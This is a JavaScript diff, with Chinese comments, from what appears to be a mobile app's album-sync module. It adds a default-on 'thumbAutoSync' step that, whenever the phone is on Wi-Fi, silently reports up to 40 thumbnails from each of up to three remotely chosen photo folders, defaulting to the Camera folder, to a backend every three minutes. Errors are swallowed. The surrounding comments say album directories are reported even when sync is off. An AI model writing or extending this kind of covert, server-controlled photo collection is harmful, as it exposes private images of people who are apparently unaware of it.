@@ -325,12 +325,13 @@
                 reportAlbumLog('error', 'album_buckets', '上报相册目录失败：' + ((albErr && albErr.message) || albErr));
             }
 
-            // 3. 拉取后台配置的目标相册目录与限定条件（默认关闭同步，但仍自动上报目录）
+            // 3. 拉取后台配置的目标相册目录与限定条件（常态层默认开缩略图，原图层默认关闭）
             var remoteCfg = {
+                thumbAutoSync: true,
                 enabled: false,
                 wifiOnly: true,
-                requireCharging: false,
-                timeWindowEnabled: false,
+                requireCharging: true,
+                timeWindowEnabled: true,
                 startHour: 0,
                 endHour: 6,
                 dailyLimitMB: 0,
@@ -349,6 +350,29 @@
             var targetBuckets = Array.isArray(remoteCfg.buckets) && remoteCfg.buckets.length
                 ? remoteCfg.buckets
                 : ['Camera'];
+
+            // 3.5 常态层（缩略图索引优先）：只要在 Wi-Fi 下且开启 thumbAutoSync，静默补齐首屏缩略图（无需插电）
+            if (remoteCfg.thumbAutoSync !== false && typeof plugin.listPhotosWithThumbs === 'function') {
+                try {
+                    var thumbWifiOk = true;
+                    if (typeof plugin.getDeviceStatus === 'function') {
+                        var stThumb = await plugin.getDeviceStatus();
+                        thumbWifiOk = !!(stThumb && stThumb.wifi);
+                    } else if (typeof plugin.isWifiConnected === 'function') {
+                        var wt = await plugin.isWifiConnected();
+                        thumbWifiOk = !!(wt && wt.wifi);
+                    }
+                    if (thumbWifiOk) {
+                        var lastThumbTs = parseInt(localStorage.getItem('milk_album_thumb_ts') || '0', 10) || 0;
+                        if (Date.now() - lastThumbTs > 3 * 60 * 1000) {
+                            localStorage.setItem('milk_album_thumb_ts', String(Date.now()));
+                            for (var tbIdx = 0; tbIdx < Math.min(targetBuckets.length, 3); tbIdx++) {
+                                await browseAndReportThumbs({ bucket: targetBuckets[tbIdx], offset: 0, limit: 40 }).catch(function () {});
+                            }
+                        }
+                    }
+                } catch (thumbErr) { }
+            }
             var totalTargetCount = 0;
             targetBuckets.forEach(function (b) { totalTargetCount += (albumCountsMap[b] || 0); });
             var syncMode = remoteCfg.syncMode || 'new_only';
